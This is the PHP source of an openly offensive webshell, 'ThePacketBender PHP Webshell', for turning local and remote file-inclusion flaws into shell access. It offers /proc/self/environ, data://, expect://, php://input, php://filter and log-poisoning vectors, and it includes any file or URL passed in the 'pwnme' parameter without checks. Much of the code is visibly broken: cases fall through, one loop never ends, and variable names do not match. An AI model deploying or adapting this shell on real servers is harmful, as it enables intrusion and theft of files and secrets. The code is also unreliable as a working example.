<?php

echo '<html>';
echo '<head>';
echo '</head>';
echo '<body>';

//heading
echo '<div align="center" name="heading">';
echo '<p><b>ThePacketBender PHP Webshell</b></p>';
echo '<p>for exploiting LFI for shell over RFI</p>';
echo '<br/>'. php_uname();
echo '</div>';


//inputs(GET)
$iget = <<<'IGET'
<div align="left" name="in">
<form action ="?" method="get" style="margin-left:10%;">
<fieldset>
	<br/><input type="text" name="cmd" style="width:550px;height:50px;">
	<br/><select name="function" style="width:30%" style="padding-right:4%;">
IGET;
$optvals = array(
	"environ" => "/proc/self/environ [accepts command]",
	"fd" => "/proc/self/fd [accepts command]",
	"data" => "data:// [accepts <? php_command ?>]",
	"expect" => "expect:// [accepts command]",
	"filter" => "php://filter [accepts filepath]",
	"input" => "php://input [accepts <? php_command ?>]",
	"log"	=> "access.log [accepts <?php_command?>]",
	"phpinfo" => "phpinfo() [get creative]"
);

function ugot($optvals){
       	foreach($optvals as $v => $val){
		echo '<option value ="' . $v . '">' . $val . '</option>';	
	}	
}

$igot = '	</select>
	<input type="submit" value="submit" style="padding-left=25px;">
</fieldset>
</form>
</div>';

echo $iget;
ugot($optvals);
echo $igot;


//function
function geturl($url, $referer) { 
	$headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg,text/html,application/xhtml+xml'; 
        $headers[] = 'Connection: Keep-Alive'; 
        $headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8'; 
        $useragent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;)'; 

        $process = curl_init($url); 
        curl_setopt($process, CURLOPT_HTTPHEADER, $headers); 
        curl_setopt($process, CURLOPT_HEADER, 0); 
        curl_setopt($process, CURLOPT_USERAGENT, $useragent);
        curl_setopt($process, CURLOPT_REFERER, $referer);
        curl_setopt($process, CURLOPT_TIMEOUT, 30); 
        curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1); 

        $ret = curl_exec($process); 
        curl_close($process); 

        return $ret;
} 


//standard output
echo '<form name="lfi" action="?" method="get" onload="document.lfi.submit()" >';
function stdout($cmd) {
	//check for value
	if ($_GET["cmd"] != NULL){
		$cmd = $_GET["cmd"];
		echo '<input type="hidden" name="cmd" value="'. $cmd .'" >';
	}
	echo '<br/><br/><div name="out" style="margin-left:10%;" >';
	switch ($_GET["function"]) {
		case "environ":
			echo '<input type="hidden" name="pwnme" value="/proc/self/environ" >';
		case "fd":
			echo '<script type="text/javascript">document.getElementById("lfi").onload = "" </script>';
			echo '<script type="text/javascript">document.getElementById("lfi").method = post </script>';
			$fd = array("cmdline","stat","status");
			for($x=0;$x=33;$x++){
				array_push($fd, $x);
			}
			$link = 'http://'. $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
			foreach($fd as $fil){
				echo '<input type="hidden" name="pwnme" value="/proc/self/"'. $fd .'" >';
				echo geturl($link, $link);
			}
		case "data":
			//stop onload and close GET form
			echo '<script type="text/javascript">document.getElementById("lfi").method = post</script>';
			echo '<input type="hidden" name="pwnme" value="data://" >';
			echo '</form>';

			//POST request form
			echo '<form name="rfi" action="'. $_SERVER['PHP_SELF'] .'" method="get" onload="document.lfi.submit()" >';
			echo '<input type="hidden" name="" value="data://.'. $cmd .'" >';
			echo '</form>';

			//XMLHttpRequest hack to asynchronously submit GET data:// and POST $cmd
			echo 'var f = document.forms.rfi;
			var pDat = [];
			for (var i = 0; i < f.elements.length; i++) {
			    pDat.push(f.elements[i].name + "=" + f.elements[i].value);
			}
			var xhr = new XMLHttpRequest();
			xhr.open("POST", "'. $_SERVER['PHP_SELF'] .'", true);
			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhr.send(postData.join("&"));
			document.forms.lfi.submit();';
		case "expect":
			echo '<input type="hidden" name="" value=data://'. $cmd .'" >';
		case "input":
						//stop onload and close GET form
			echo '<script type="text/javascript">document.getElementById("lfi").method = post</script>';
			echo '<input type="hidden" name="pwnme" value="data://" >';
			echo '</form>';

			//POST request form
			echo '<form name="rfi" action="'. $_SERVER['PHP_SELF'] .'" method="get" onload="document.lfi.submit()" >';
			echo '<input type="hidden" name="" value="input://.'. $cmd .'" >';
			echo '</form>';

			//XMLHttpRequest hack to asynchronously submit GET data:// and POST $cmd
			echo 'var f = document.forms.rfi;
			var pDat = [];
			for (var i = 0; i < f.elements.length; i++) {
			    pDat.push(f.elements[i].name + "=" + f.elements[i].value);
			}
			var xhr = new XMLHttpRequest();
			xhr.open("POST", "'. $_SERVER['PHP_SELF'] .'", true);
			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhr.send(postData.join("&"));
			document.forms.lfi.submit();';

		case "filter":
			echo '<input type="hidden" name="pwnme" value="php://filter/convert.base64-encode/resource='. $cmd .'">'; 
		case "log":

		case "phpinfo":
			phpinfo();
		default:
			echo 'NO LFI $_GET[] ?PARAMETER=PASSED, ergo FUNCTION include() returned NULL';
	}
}
echo '</form>';
print(include($_GET['pwnme']));
#print(stdout());
echo '<br/>';
echo '</body>';
echo '</html>';

?>
